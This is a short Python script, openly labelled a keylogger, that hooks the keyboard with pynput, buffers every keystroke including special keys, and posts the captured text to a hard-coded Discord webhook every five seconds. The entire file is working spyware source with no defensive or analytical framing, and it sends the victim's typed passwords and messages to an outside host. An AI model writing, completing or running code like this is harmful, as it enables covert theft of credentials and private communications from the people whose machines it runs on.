# Keylogger to send keystrokes to Discord
from pynput import keyboard
import requests
import time

# Your Discord webhook URL
WEBHOOK_URL = "https://discord.com/ap1/webhooks/1339494923732258916/DImf5tonKsIax2J1hNtmn3EvJdvxqWhhNlQGLBFVefavLXz4Y010NWfMTp6AM7ZzCnh7"
# Store logged keys
log = ""
last_sent_time = time.time()  # Track the last time we sent data
SEND_INTERVAL = 5  # Send logs every 5 seconds

# Function to send data to Discord
def send_to_discord(message):
    global last_sent_time
    if message.strip():  # Send only if there's something typed
        data = {"content": f"Keystrokes: {message}"}
        requests.post(WEBHOOK_URL, json=data)
        last_sent_time = time.time()  # Update last sent time

# Key press event
def on_press(key):
    global log

    try:
        log += key.char  # Get character
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        else:
            log += f" [{key.name}] "

    # Send data every 5 seconds if there's new text
    if time.time() - last_sent_time > SEND_INTERVAL:
        send_to_discord(log)
        log = ""  # Clear the log after sending

# Start key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()